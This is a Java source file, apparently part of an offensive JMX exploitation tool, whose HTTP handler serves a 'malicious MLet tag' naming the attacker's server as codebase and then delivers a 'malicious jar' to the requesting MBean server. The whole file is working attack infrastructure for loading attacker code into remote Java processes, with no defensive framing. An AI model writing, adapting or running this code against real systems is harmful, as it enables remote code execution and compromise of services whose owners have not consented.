package fr.jrjgjk.mbeanhelpers;

import fr.jrjgjk.LocalServer;
import fr.jrjgjk.helpers.Printer;
import fr.jrjgjk.helpers.Utils;

import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;
import java.io.OutputStream;
import java.io.IOException;

public class MBeanServerHandler implements HttpHandler{

	private String packageName;
	private String jarName;
	private String objectName;
	private String jarPath;

	private LocalServer lServer;


	public MBeanServerHandler(String packageName, String objectName, String jarPath, String jarName, LocalServer lServer){
		this.packageName = packageName;
		this.objectName = objectName;
		this.jarName = jarName;
		this.jarPath = jarPath;
		this.lServer = lServer;
	}

	public void handle(HttpExchange httpExchange) throws IOException {
		if(httpExchange.getRequestMethod().equalsIgnoreCase("GET")){
			Printer.info("GET " + httpExchange.getRequestURI());
			if(httpExchange.getRequestURI().toString().endsWith(".jar")){
				handleJarResponse(httpExchange);
			} else {
				handleResponse(httpExchange);
			}
		} else {
			Printer.err("Receive weird connection: " + httpExchange.getRequestMethod());
		}
	}

	private void handleResponse(HttpExchange httpExchange) throws IOException {
		OutputStream outputStream = httpExchange.getResponseBody();
		StringBuilder htmlBuilder = new StringBuilder();

		String maliciousMlet = buildMaliciousTag();

		Printer.vinfo("Sending malicious MLet tag:");
		Printer.vinfo("	 " + maliciousMlet);

		htmlBuilder.append("<html>").
					append(maliciousMlet).
					append("</html>");

		httpExchange.sendResponseHeaders(200, htmlBuilder.length());
		outputStream.write(htmlBuilder.toString().getBytes());
		outputStream.flush();
		outputStream.close();

	}

	private void handleJarResponse(HttpExchange httpExchange) throws IOException {
		try{
			OutputStream outputStream = httpExchange.getResponseBody();
			byte[] jarContent = Utils.readFile(this.jarPath + "/" + this.jarName);
			
			httpExchange.sendResponseHeaders(200, jarContent.length);
			
			outputStream.write(jarContent);
			outputStream.flush();
			outputStream.close();
			Printer.log("Malicious jar sent!");
		} catch(IOException ex){
			Printer.err("Failed");
			ex.printStackTrace();
			System.exit(1);
		}
	}

	private String buildMaliciousTag(){
		return String.format("<mlet code=\"%s\" archive=\"%s\" name=\"%s\" codebase=\"%s/\"></mlet>", this.packageName, this.jarName, this.objectName, this.lServer.getUrl());
	}


}